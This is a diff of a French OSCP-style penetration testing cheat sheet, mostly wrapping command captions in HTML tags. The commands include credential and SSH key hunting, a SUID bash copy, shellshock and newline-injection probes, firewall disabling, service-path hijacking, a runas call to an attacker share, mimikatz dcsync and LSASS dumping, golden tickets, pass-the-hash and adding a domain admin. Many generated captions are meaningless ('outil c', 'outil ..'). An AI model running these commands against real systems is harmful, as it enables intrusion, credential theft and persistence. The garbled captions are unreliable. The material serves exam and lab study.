@@ -16,14 +16,14 @@ Vérifier les ports et les services de la cible autorisée.
 ### Méthodologie générale
 
 
-Tester ou établir une connexion réseau avec Netcat.
+<p class="oscp-command-note">Tester ou établir une connexion réseau avec Netcat.</p>
 
 ```bash
 nc -v [ip] [port]
 ```
 
 
-Commande `telnet` pour la rubrique « Méthodologie générale ».
+<p class="oscp-command-note">Tester une connexion au port indiqué avec Telnet.</p>
 
 ```text
 telnet [ip] [port]
@@ -34,7 +34,7 @@ telnet [ip] [port]
 `site:github.com *Service version.release`  
 
 
-Commande `version` pour la rubrique « Méthodologie générale ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil version.</p>
 
 ```text
 version + github + exploit search
@@ -46,42 +46,38 @@ version + github + exploit search
 `root:root`  
 
 
-Exemple technique pour la rubrique « Méthodologie générale ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Méthodologie générale ».</p>
 
 ```text
 [boxname]:admin
 ```
 
 
-Exemple technique pour la rubrique « Méthodologie générale ».
-
 ```text
 [boxname]:password
 ```
 
-
-Exemple technique pour la rubrique « Méthodologie générale ».
 
 ```text
 [appName]:[appName]
 ```
 
 
-Commande `admin` pour la rubrique « Méthodologie générale ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil admin.</p>
 
 ```text
 admin:no pass
 ```
 
 
-Commande `root` pour la rubrique « Méthodologie générale ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil root.</p>
 
 ```text
 root:no pass
 ```
 
 
-Commande `pass` pour la rubrique « Méthodologie générale ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil pass.</p>
 
 ```text
 pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret
@@ -94,7 +90,7 @@ pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret
 `zip2john` · `7z2john` · `dnSpy`  
 
 
-Commande `gpp` pour la rubrique « Méthodologie générale ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil gpp.</p>
 
 ```text
 gpp decrypt
@@ -115,7 +111,7 @@ Transférer ou récupérer des fichiers dans le laboratoire.
 `exiftool` · `binary` · `.exe`  
 
 
-Commande `/var/ftp/anon/` pour la rubrique « FTP (with Null Session) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil /var/ftp/anon/.</p>
 
 ```text
 /var/ftp/anon/<directory-name-ifapplies>
@@ -134,7 +130,7 @@ Commande `/var/ftp/anon/` pour la rubrique « FTP (with Null Session) ».
 `nmap`  
 
 
-Vérifier des identifiants dans un environnement autorisé.
+<p class="oscp-command-note">Vérifier des identifiants dans un environnement autorisé.</p>
 
 ```bash
 HYDRA SMTP ENUM
@@ -150,7 +146,7 @@ Interroger les enregistrements DNS et identifier les services associés.
 `autorecon` · `nslookup`  
 
 
-Interroger les enregistrements DNS.
+<p class="oscp-command-note">Interroger les enregistrements DNS.</p>
 
 ```bash
 dig axfr
@@ -169,7 +165,7 @@ Examiner les objets, les droits et les services du domaine.
 `LIST`  
 
 
-Commande `retr` pour la rubrique « POP3 ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil retr.</p>
 
 ```text
 retr <number>
@@ -204,7 +200,7 @@ Examiner les objets, les droits et les services du domaine.
 Examiner les objets, les droits et les services du domaine.
 
 
-Commande `pwd` pour la rubrique « LDAP (with Null Session) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil pwd.</p>
 
 ```text
 pwd
@@ -240,11 +236,7 @@ Examiner les entrées et les réponses de l'application web.
 Vérifier les ports et les services de la cible autorisée.
 
 
-Commande `apache` pour la rubrique « Scan initial ».
-
-```text
-Apache 2.4.49
-```
+**Version du serveur dans l'exemple :** `Apache 2.4.49`.
 
 
 ### Analyse de vulnérabilités
@@ -254,7 +246,7 @@ Apache 2.4.49
 `href` · `exiftool` · `html2markdown`  
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 curl -s http://[ip]/ | html2markdown
@@ -270,7 +262,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `username:username` · `username:password` · `pass` · `passwd`  
 
 
-Commande `pwd` pour la rubrique « Énumération des utilisateurs and Credential Gathering ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil pwd.</p>
 
 ```text
 pwd
@@ -291,7 +283,7 @@ Examiner les entrées et les réponses de l'application web.
 `/etc/hosts` · `phpinfo`  
 
 
-Exemple technique pour la rubrique « CMS and Version Detection ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « CMS and Version Detection ».</p>
 
 ```text
 $_SERVER[CONTEXT_DOCUMENT_ROOT]: [C:/xampp/htdocs]
@@ -321,7 +313,7 @@ Examiner les entrées et les réponses de l'application web.
 ### Directory and File Énumération
 
 
-Commande `/` pour la rubrique « Directory and File Énumération ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil /.</p>
 
 ```text
 /[boxName]
@@ -332,7 +324,7 @@ Commande `/` pour la rubrique « Directory and File Énumération ».
 `/cgi-bin/`  
 
 
-Examiner le service avec les scripts NSE sélectionnés.
+<p class="oscp-command-note">Examiner le service avec les scripts NSE sélectionnés.</p>
 
 ```bash
 nmap -sV -p [port] --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=echo\;/bin/ls [ip]
@@ -343,7 +335,7 @@ nmap -sV -p [port] --script http-shellshock --script-args uri=/cgi-bin/user.sh,c
 `/cgi-bin/` · `wfuzz` · `ffuf` · `forgot_pass.php`  
 
 
-Commande `get` pour la rubrique « Directory and File Énumération ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil get.</p>
 
 ```text
 GET /forgot_pass.php?email=%0aid
@@ -362,7 +354,7 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 ### Authentification and Login Forms
 
 
-Commande `pip3` pour la rubrique « Authentification and Login Forms ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil pip3.</p>
 
 ```text
 pip3 install defaultcreds-cheat-sheet
@@ -382,14 +374,14 @@ Examiner les permissions et la configuration de Linux.
 #### Principles to Becoming Root
 
 
-Commande `-l` pour la rubrique « Principles to Becoming Root ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil -l.</p>
 
 ```bash
 sudo -l
 ```
 
 
-Commande `cp` pour la rubrique « Principles to Becoming Root ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil cp.</p>
 
 ```text
 cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash
@@ -399,7 +391,7 @@ cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash
 #### Énumération générale
 
 
-Commande `ls` pour la rubrique « Énumération générale ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ls.</p>
 
 ```text
 ls -la
@@ -410,7 +402,7 @@ ls -la
 `root:root` · `linpeas.sh` · `PwnKit`  
 
 
-Commande `pass` pour la rubrique « Énumération générale ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil pass.</p>
 
 ```text
 pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret
@@ -421,7 +413,7 @@ pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret
 `/opt` · `/srv`  
 
 
-Rechercher ou filtrer des données.
+<p class="oscp-command-note">Rechercher ou filtrer des données.</p>
 
 ```text
 find / -name "*.py"
@@ -435,7 +427,7 @@ find / -name "*.py"
 `/root/.ssh/id_rsa`  
 
 
-Exemple technique pour la rubrique « Configurations Files ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Configurations Files ».</p>
 
 ```bash
 (env || set) 2>/dev/null
@@ -450,7 +442,7 @@ echo $PATH
 `PSPY`  
 
 
-Commande `mysql` pour la rubrique « Services and Jobs ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil mysql.</p>
 
 ```text
 mysql -uroot -pdasdasd
@@ -470,14 +462,14 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `/etc/passwd` · `/etc/shadow` · `/etc/sudoers`  
 
 
-Commande `pass` pour la rubrique « Credentials Search ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil pass.</p>
 
 ```text
 pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret
 ```
 
 
-Rechercher ou filtrer des données.
+<p class="oscp-command-note">Rechercher ou filtrer des données.</p>
 
 ```bash
 grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
@@ -486,7 +478,7 @@ locate password | more
 ```
 
 
-Commande `history` pour la rubrique « Credentials Search ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil history.</p>
 
 ```powershell
 history
@@ -494,22 +486,20 @@ cat ~/.bash_history
 ```
 
 
-Commande `history` pour la rubrique « Credentials Search ».
-
 ```bash
 history
 cat ~/.bash_history
 ```
 
 
-Commande `strings` pour la rubrique « Credentials Search ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil strings.</p>
 
 ```bash
 strings /dev/mem -n10 | grep -i PASS
 ```
 
 
-Commande `cat` pour la rubrique « Credentials Search ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil cat.</p>
 
 ```bash
 cat ~/.ssh/id_rsa
@@ -519,7 +509,7 @@ find / -name id_rsa 2> /dev/null
 ```
 
 
-Rechercher ou filtrer des données.
+<p class="oscp-command-note">Rechercher ou filtrer des données.</p>
 
 ```bash
 find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
@@ -534,7 +524,7 @@ Observer les permissions et la configuration de Windows.
 #### General Énumération des utilisateurs
 
 
-Afficher des informations de la session ou du système.
+<p class="oscp-command-note">Afficher des informations de la session ou du système.</p>
 
 ```powershell
 whoami /all
@@ -547,7 +537,7 @@ Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 ```
 
 
-Commande `net` pour la rubrique « General Énumération des utilisateurs ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil net.</p>
 
 ```powershell
 net localgroup
@@ -558,35 +548,29 @@ net localgroup Administrators
 #### System Énumération
 
 
-Afficher des informations de la session ou du système.
+<p class="oscp-command-note">Afficher des informations de la session ou du système.</p>
 
 ```powershell
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 ```
 
 
-Commande `wmic` pour la rubrique « System Énumération ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil wmic.</p>
 
 ```powershell
 wmic qfe
 ```
 
 
-Commande `wmic` pour la rubrique « System Énumération ».
-
 ```powershell
 wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
 ```
 
 
-Commande `wmic` pour la rubrique « System Énumération ».
-
 ```powershell
 wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
 ```
 
-
-Commande `wmic` pour la rubrique « System Énumération ».
 
 ```powershell
 wmic logicaldisk get caption || fsutil fsinfo drives
@@ -595,7 +579,7 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
 ```
 
 
-Exemple technique pour la rubrique « System Énumération ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « System Énumération ».</p>
 
 ```bash
 # List of exploits kernel https://github.com/SecWiki/windows-kernel-exploits
@@ -607,7 +591,7 @@ $ i586-mingw32msvc-gcc -o adduser.exe useradd.c
 #### Énumération réseau
 
 
-Afficher des informations de la session ou du système.
+<p class="oscp-command-note">Afficher des informations de la session ou du système.</p>
 
 ```powershell
 ipconfig /all
@@ -616,7 +600,7 @@ Get-DnsClientServerAddress -AddressFamily IPv4 | ft
 ```
 
 
-Commande `route` pour la rubrique « Énumération réseau ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil route.</p>
 
 ```powershell
 route print
@@ -624,7 +608,7 @@ Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIn
 ```
 
 
-Commande `arp` pour la rubrique « Énumération réseau ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil arp.</p>
 
 ```powershell
 arp -A
@@ -632,21 +616,19 @@ Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,Stat
 ```
 
 
-Commande `netstat` pour la rubrique « Énumération réseau ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil netstat.</p>
 
 ```powershell
 netstat -ano
 ```
 
 
-Commande `netstat` pour la rubrique « Énumération réseau ».
-
 ```powershell
 netstat -bona
 ```
 
 
-Commande `netsh` pour la rubrique « Énumération réseau ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil netsh.</p>
 
 ```powershell
 netsh advfirewall firewall dump
@@ -655,14 +637,14 @@ netsh firewall show config
 ```
 
 
-Exemple technique pour la rubrique « Énumération réseau ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Énumération réseau ».</p>
 
 ```powershell
 $f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
 ```
 
 
-Commande `netsh` pour la rubrique « Énumération réseau ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil netsh.</p>
 
 ```powershell
 netsh advfirewall set allprofiles state off
@@ -670,7 +652,7 @@ netsh firewall set opmode disable
 ```
 
 
-Commande `net` pour la rubrique « Énumération réseau ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil net.</p>
 
 ```powershell
 net share
@@ -678,7 +660,7 @@ powershell Find-DomainShare -ComputerDomain domain.local
 ```
 
 
-Commande `reg` pour la rubrique « Énumération réseau ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil reg.</p>
 
 ```powershell
 reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
@@ -689,7 +671,7 @@ Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 #### Misconfigurations
 
 
-Commande `sc` pour la rubrique « Misconfigurations ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil sc.</p>
 
 ```powershell
 # using sc
@@ -707,7 +689,7 @@ exploit/windows/local/service_permissions
 ```
 
 
-Commande `wmic` pour la rubrique « Misconfigurations ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil wmic.</p>
 
 ```powershell
 wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\" |findstr /i /v ""
@@ -716,7 +698,7 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 ```
 
 
-Commande `sc` pour la rubrique « Misconfigurations ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil sc.</p>
 
 ```powershell
 # if the group "Authenticated users" has SERVICE_ALL_ACCESS
@@ -739,7 +721,7 @@ net stop [service name] && net start [service name]
 ```
 
 
-Commande `for` pour la rubrique « Misconfigurations ».
+<p class="oscp-command-note">Exécuter la boucle de vérification des hôtes.</p>
 
 ```powershell
 for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
@@ -752,7 +734,7 @@ FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >>
 ```
 
 
-Commande `reg` pour la rubrique « Misconfigurations ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil reg.</p>
 
 ```powershell
 reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services
@@ -767,7 +749,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t RE
 ```
 
 
-Commande `dir` pour la rubrique « Misconfigurations ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil dir.</p>
 
 ```powershell
 dir /a "C:\Program Files"
@@ -779,7 +761,7 @@ Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 ```
 
 
-Commande `accesschk.exe` pour la rubrique « Misconfigurations ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil accesschk.exe.</p>
 
 ```powershell
 # using accesschk.exe
@@ -805,7 +787,7 @@ Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Ac
 ```
 
 
-Commande `for` pour la rubrique « Misconfigurations ».
+<p class="oscp-command-note">Exécuter la boucle de vérification des hôtes.</p>
 
 ```powershell
 # PATH DLL Hijacking
@@ -814,7 +796,7 @@ for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F
 ```
 
 
-Commande `reg` pour la rubrique « Misconfigurations ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil reg.</p>
 
 ```powershell
 # if both are enabled (set to 0x1), it's possible to execute
@@ -836,7 +818,7 @@ msiexec /quiet /qn /i C:\Users\Homer.NUCLEAR\Downloads\donuts.msi
 ```
 
 
-Commande `schtasks` pour la rubrique « Misconfigurations ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil schtasks.</p>
 
 ```powershell
 # using schtasks
@@ -851,7 +833,7 @@ Get-ScheduledTask | where {$_.TaskPath -nolike "\Microsoft*"} | ft TaskName,Task
 ```
 
 
-Commande `wsl` pour la rubrique « Misconfigurations ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil wsl.</p>
 
 ```powershell
 wsl whoami
@@ -866,7 +848,7 @@ wsl python -c 'put here your command'
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-Commande `powershell.exe` pour la rubrique « Credential Access ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil powershell.exe.</p>
 
 ```powershell
 # Using powershell
@@ -874,7 +856,7 @@ powershell.exe Start-Process cmd.exe -Verb runAs
 ```
 
 
-Commande `c` pour la rubrique « Credential Access ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
 
 ```powershell
 # Check also with runas
@@ -882,7 +864,7 @@ C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\us
 ```
 
 
-Commande `dir` pour la rubrique « Credential Access ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil dir.</p>
 
 ```powershell
 dir /s /b /p *pass* == *cred* == *vnc* == *.config* == *conf* == *ini*
@@ -890,7 +872,7 @@ findstr /si /m password *.xml *.ini *.txt
 ```
 
 
-Commande `cmdkey` pour la rubrique « Credential Access ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil cmdkey.</p>
 
 ```powershell
 cmdkey /list
@@ -899,7 +881,7 @@ runas /savecred /user:WORKGROUP\Administrator "\\attacker-ip\SHARE\welcome.exe"
 ```
 
 
-Commande `reg` pour la rubrique « Credential Access ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil reg.</p>
 
 ```powershell
 reg query HKLM /f pass /t REG_SZ /s
@@ -928,7 +910,7 @@ reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
 ```
 
 
-Commande `c` pour la rubrique « Credential Access ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
 
 ```powershell
 c:\sysprep.inf
@@ -938,14 +920,14 @@ c:\sysprep\sysprep.xml
 ```
 
 
-Commande `dir` pour la rubrique « Credential Access ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil dir.</p>
 
 ```powershell
 dir /s /b /p *access*.log* == *.log
 ```
 
 
-Commande `get-childitem` pour la rubrique « Credential Access ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil get-childitem.</p>
 
 ```powershell
 Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
@@ -956,7 +938,7 @@ C:\inetpub\wwwroot\web.config
 ```
 
 
-Commande `dir` pour la rubrique « Credential Access ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil dir.</p>
 
 ```powershell
 dir c:*vnc.ini /s /b
@@ -1025,7 +1007,7 @@ TypedURLs #IE
 ```
 
 
-Commande `netsh` pour la rubrique « Credential Access ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil netsh.</p>
 
 ```powershell
 # 1. Find AP SSID
@@ -1038,14 +1020,14 @@ cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| fi
 ```
 
 
-Commande `c` pour la rubrique « Credential Access ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
 
 ```powershell
 c:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
 ```
 
 
-Commande `import-module` pour la rubrique « Credential Access ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil import-module.</p>
 
 ```powershell
 # SessionGopher to grab PuTTY, WinSCP, FileZilla, SuperPuTTY, RDP
@@ -1056,7 +1038,7 @@ Invoke-SessionGopher -AllDomain -u domain.com\adm\-arvanaghi -p s3cr3tP@ss
 ```
 
 
-Commande `type` pour la rubrique « Credential Access ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil type.</p>
 
 ```powershell
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
@@ -1067,7 +1049,7 @@ cat (Get-PSReadlineOption).HistorySavePath | sls passw
 ```
 
 
-Commande `get-item` pour la rubrique « Credential Access ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil get-item.</p>
 
 ```powershell
 Get-Item -path <filename> -Stream *
@@ -1075,7 +1057,7 @@ Get-Content -path <filename> -Stream <keyword>
 ```
 
 
-Exemple technique pour la rubrique « Credential Access ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Credential Access ».</p>
 
 ```powershell
 # Usually %SYSTEMROOT% = C:\Windows
@@ -1088,7 +1070,7 @@ Exemple technique pour la rubrique « Credential Access ».
 ```
 
 
-Commande `.aws` pour la rubrique « Credential Access ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil .aws.</p>
 
 ```powershell
 # From user home
@@ -1101,7 +1083,7 @@ AppData\Roaming\gcloud\access_tokens.db
 ```
 
 
-Commande `c` pour la rubrique « Credential Access ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
 
 ```powershell
 # Before Vista look inside
@@ -1121,7 +1103,7 @@ gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
 ```
 
 
-Commande `hkey_users` pour la rubrique « Credential Access ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil hkey_users.</p>
 
 ```powershell
 HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\
@@ -1129,21 +1111,19 @@ HKCU\Software\Microsoft\Terminal Server Client\Servers\
 ```
 
 
-Commande `remote` pour la rubrique « Credential Access ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil remote.</p>
 
 ```text
 Remote desktop credential manager
 ```
 
 
-Exemple technique pour la rubrique « Credential Access ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Credential Access ».</p>
 
 ```powershell
  %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
 ```
 
-
-Exemple technique pour la rubrique « Credential Access ».
 
 ```powershell
 # Check if the retrieved sotfwares are vulnerable to DLL Sideloading
@@ -1162,7 +1142,7 @@ Examiner les objets, les droits et les services du domaine.
 #### Énumération de base
 
 
-Commande `hostname` pour la rubrique « Énumération de base ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil hostname.</p>
 
 ```powershell
 hostname
@@ -1174,14 +1154,12 @@ ipconfig /all
 `inactive/legacy`  
 
 
-Commande `net` pour la rubrique « Énumération de base ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil net.</p>
 
 ```powershell
 net user
 ```
 
-
-Commande `net` pour la rubrique « Énumération de base ».
 
 ```powershell
 net view \\[external_machine_ip]
@@ -1191,14 +1169,14 @@ net view \\[external_machine_ip]
 #### Élévation de privilèges
 
 
-Commande `sc` pour la rubrique « Élévation de privilèges ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil sc.</p>
 
 ```powershell
 sc query state= all | findstr "SERVICE_NAME"
 ```
 
 
-Commande `dir` pour la rubrique « Élévation de privilèges ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil dir.</p>
 
 ```powershell
 # Look for them in C:\\ProgramData, C:\\Users\\All Users, and application-specific folders like C:\\Program Files.
@@ -1211,7 +1189,7 @@ dir /s /b C:\\Users\\Public\\*.config
 `impacket-secretsdump`  
 
 
-Commande `reg` pour la rubrique « Élévation de privilèges ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil reg.</p>
 
 ```bash
 # Run in Windows
@@ -1226,7 +1204,7 @@ impacket-secretsdump -sam <sam_file> -system <system_file> LOCAL
 #### Mouvement latéral
 
 
-Commande `evil-winrm` pour la rubrique « Mouvement latéral ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil evil-winrm.</p>
 
 ```bash
 # Evil-WinRM
@@ -1240,7 +1218,7 @@ impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM_hash> <username>
 ```
 
 
-Commande `xfreerdp` pour la rubrique « Mouvement latéral ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil xfreerdp.</p>
 
 ```bash
 # RDP
@@ -1264,7 +1242,7 @@ impacket-wmiexec <username>:<password>@<target_ip>
 `cpassword` · `SYSVOL`  
 
 
-Commande `dir` pour la rubrique « Élévation de privilèges ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil dir.</p>
 
 ```powershell
 # Check for cpassword in the SYSvol share to obtain cleartext passwords in XML files.
@@ -1279,28 +1257,28 @@ smbclient //dc-ip/SYSVOL -U "domain\username"
 `SharpHound` · `BloodHound`  
 
 
-Commande `shortest` pour la rubrique « Élévation de privilèges ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil shortest.</p>
 
 ```text
 Shortest Path to Domain Admins
 ```
 
 
-Commande `.` pour la rubrique « Élévation de privilèges ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ..</p>
 
 ```powershell
 .\\SharpHound.exe -c All -d <domain> -u <username> -p <password> -f AllData
 ```
 
 
-Commande `schtasks` pour la rubrique « Élévation de privilèges ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil schtasks.</p>
 
 ```powershell
 schtasks /query /fo LIST /v
 ```
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```powershell
 # Test for WinRM
@@ -1331,7 +1309,7 @@ Examiner les objets, les droits et les services du domaine.
 `mimikatz`  
 
 
-Commande `mimikatz` pour la rubrique « Targeted AD Attacks on DC ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.</p>
 
 ```powershell
 mimikatz # lsadump::dcsync /domain:<domain> /user:<target_user>
@@ -1342,7 +1320,7 @@ mimikatz # lsadump::dcsync /domain:<domain> /user:<target_user>
 `NTDS.dit`  
 
 
-Commande `c` pour la rubrique « Targeted AD Attacks on DC ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
 
 ```text
 C:\Windows\NTDS\
@@ -1353,7 +1331,7 @@ C:\Windows\NTDS\
 `NTDS.dit` · `SYSTEM` · `impacket-secretsdump`  
 
 
-Commande `impacket-secretsdump` pour la rubrique « Targeted AD Attacks on DC ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-secretsdump.</p>
 
 ```bash
 impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
@@ -1363,7 +1341,7 @@ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 #### Golden Ticket Attack for Persistent Access
 
 
-Commande `kerberos` pour la rubrique « Golden Ticket Attack for Persistent Access ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil kerberos.</p>
 
 ```powershell
 kerberos::golden /domain:<domain> /sid:<domain_SID> /krbtgt:<NTLM_hash> /user:Administrator
@@ -1379,7 +1357,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `LSASS` · `Mimikatz`  
 
 
-Commande `mimikatz` pour la rubrique « Credential Harvesting with LSASS ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.</p>
 
 ```powershell
 mimikatz # sekurlsa::logonPasswords
@@ -1389,28 +1367,26 @@ mimikatz # sekurlsa::logonPasswords
 ### Post-Exploitation and Flag Collection
 
 
-Commande `c` pour la rubrique « Post-Exploitation and Flag Collection ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
 
 ```text
 C:\\Users\\Public
 ```
 
 
-Commande `c` pour la rubrique « Post-Exploitation and Flag Collection ».
-
 ```text
 C:\\Users\\[Administrator/any_user]\\Desktop
 ```
 
 
-Commande `hostname` pour la rubrique « Post-Exploitation and Flag Collection ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil hostname.</p>
 
 ```powershell
 hostname && whoami && ipconfig /all && type [local/proof].txt
 ```
 
 
-Commande `net` pour la rubrique « Post-Exploitation and Flag Collection ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil net.</p>
 
 ```powershell
 net user new_admin <password> /add /domain
